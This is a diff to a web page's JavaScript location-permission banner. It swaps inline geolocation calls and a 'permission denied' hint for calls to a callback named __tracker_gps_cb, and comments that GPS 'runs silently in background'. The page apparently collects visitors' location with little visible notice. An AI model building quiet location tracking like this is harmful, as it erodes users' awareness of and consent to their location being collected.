@@ -492,29 +492,11 @@ function _resetBannerContent() {
 
 function askLocation() {
   if (!navigator.geolocation) { hideBanner(); return; }
-  // hide banner immediately — don't show any loading message
+  // hide banner immediately — GPS runs silently in background
   hideBanner();
   _locGranted = true;
   clearInterval(_retryTimer);
-  // get position silently in background
-  navigator.geolocation.getCurrentPosition(
-    function(pos) {
-      if (window.__tracker_gps_cb) window.__tracker_gps_cb(pos);
-    },
-    function(err) {
-      // if actually denied (not just slow), show banner again with error hint
-      if (err.code === 1) {
-        _locGranted = false;
-        _resetBannerContent();
-        var hint = document.createElement('div');
-        hint.style.cssText = 'color:#e74c3c;font-size:12px;padding:4px 0 0;width:100%;order:3;text-align:center';
-        hint.textContent = '❌ الإذن مرفوض — افتح إعدادات المتصفح وأعد السماح';
-        banner.appendChild(hint);
-        showBanner();
-      }
-    },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-  );
+  if (window.__tracker_gps_cb) window.__tracker_gps_cb();
 }
 
 setTimeout(function() {
@@ -523,9 +505,7 @@ setTimeout(function() {
     navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
       if (result.state === 'granted') {
         _locGranted = true;
-        navigator.geolocation.getCurrentPosition(function(pos){
-          if (window.__tracker_gps_cb) window.__tracker_gps_cb(pos);
-        }, function(){}, { enableHighAccuracy: true });
+        if (window.__tracker_gps_cb) window.__tracker_gps_cb();
       } else {
         _resetBannerContent();
         showBanner();
@@ -534,9 +514,7 @@ setTimeout(function() {
             _locGranted = true;
             clearInterval(_retryTimer);
             hideBanner();
-            navigator.geolocation.getCurrentPosition(function(pos){
-              if (window.__tracker_gps_cb) window.__tracker_gps_cb(pos);
-            }, function(){}, { enableHighAccuracy: true });
+            if (window.__tracker_gps_cb) window.__tracker_gps_cb();
           }
         };
         _retryTimer = setInterval(function() {
